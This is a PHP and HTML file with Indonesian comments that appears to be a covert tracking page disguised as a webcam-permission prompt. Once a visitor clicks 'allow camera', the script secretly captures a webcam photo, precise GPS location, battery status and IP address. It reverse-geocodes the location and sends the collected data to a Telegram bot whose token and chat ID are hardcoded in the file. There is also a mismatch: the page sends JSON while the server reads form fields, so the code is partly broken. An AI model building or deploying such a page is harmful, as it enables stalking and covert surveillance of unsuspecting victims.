<?php
// Fungsi untuk mengirim pesan ke Telegram Bot
function sendMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Token dan Chat ID Telegram Bot
$token = "7264176480:AAFFZvDsk5sYsqPk9h4usFpzE_rtpHVC_dA"; // Ganti dengan token bot Anda
$chatID = "7720846619"; // Ganti dengan chat ID Anda

// Tangkap IP address pengguna
$ipaddress = $_SERVER['REMOTE_ADDR'];

// Tangkap data dari POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = "IP Address: $ipaddress\n";

    if (isset($_POST['battery'])) {
        // Tangkap data baterai
        $batteryLevel = $_POST['battery']['level'];
        $batteryCharging = $_POST['battery']['charging'] ? 'Sedang diisi' : 'Tidak diisi';
        $message .= "Status Baterai:\nLevel: " . ($batteryLevel * 100) . "%\nStatus: " . $batteryCharging . "\n";
    }

    if (isset($_POST['location'])) {
        // Tangkap lokasi pengguna
        $latitude = $_POST['location']['lat'];
        $longitude = $_POST['location']['lon'];
        $accuracy = $_POST['location']['acc'];

        // Dapatkan kota/provinsi menggunakan API Nominatim (OpenStreetMap)
        $locationDetails = file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat=$latitude&lon=$longitude");
        $locationDetails = json_decode($locationDetails, true);
        $city = $locationDetails['address']['city'] ?? $locationDetails['address']['town'] ?? $locationDetails['address']['village'] ?? 'Tidak Diketahui';
        $state = $locationDetails['address']['state'] ?? 'Tidak Diketahui';

        $message .= "Lokasi Pengguna:\nLatitude: $latitude\nLongitude: $longitude\nAccuracy: $accuracy meters\nKota: $city\nProvinsi: $state\nGoogle Maps: https://www.google.com/maps/place/$latitude,$longitude\n";
    }

    if (isset($_POST['image'])) {
        // Tangkap gambar dari webcam
        $imageData = $_POST['image'];
        $filteredData = substr($imageData, strpos($imageData, ",") + 1);
        $unencodedData = base64_decode($filteredData);
        $filename = 'cam_' . date('YmdHis') . '.png';
        file_put_contents($filename, $unencodedData);

        $message .= "Gambar dari webcam: " . $filename . "\n";
    }

    // Kirim pesan ke Telegram
    if (!empty($message)) {
        sendMessage($chatID, $message, $token);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        #canvas {
            display: none;
        }
        #permission-btn {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Tombol Izin Kamera -->
        <button id="permission-btn">Izinkan Kamera</button>

        <!-- Webcam Capture -->
        <div>
            <video id="video" width="640" height="480" autoplay></video>
            <canvas id="canvas" width="640" height="480"></canvas>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const permissionBtn = document.getElementById('permission-btn');

        // Fungsi untuk mengirim lokasi akurat
        const sendAccurateLocation = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;

                    // Kirim lokasi akurat ke server
                    fetch('index.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ location: { lat: lat, lon: lon, acc: acc } })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Accurate location sent:', data);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                }, (error) => {
                    console.error("Error getting location: ", error);
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        };

        // Fungsi untuk mengirim lokasi tidak akurat (hanya kota/provinsi)
        const sendInaccurateLocation = () => {
            fetch('index.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ location: { lat: 'Tidak Diketahui', lon: 'Tidak Diketahui', acc: 'Tidak Diketahui' } })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Inaccurate location sent:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        };

        // Fungsi untuk mengirim data baterai
        const sendBatteryData = () => {
            if ('getBattery' in navigator) {
                navigator.getBattery().then((battery) => {
                    const batteryData = {
                        level: battery.level,
                        charging: battery.charging
                    };

                    // Kirim data baterai ke server
                    fetch('index.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ battery: batteryData })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Battery data sent:', data);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                });
            } else {
                console.error("Battery API not supported.");
            }
        };

        // Ketika tombol "Izinkan Kamera" diklik
        permissionBtn.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;

                    // Ambil gambar dari webcam
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL('image/png');

                    // Kirim gambar ke server
                    fetch('index.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ image: imageData })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Image sent:', data);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });

                    // Kirim lokasi akurat
                    sendAccurateLocation();
                })
                .catch((err) => {
                    console.error("Error accessing webcam: ", err);

                    // Jika kamera tidak diizinkan, kirim lokasi tidak akurat
                    sendInaccurateLocation();
                });

            // Kirim data baterai
            sendBatteryData();
        });
    </script>
</body>
</html>
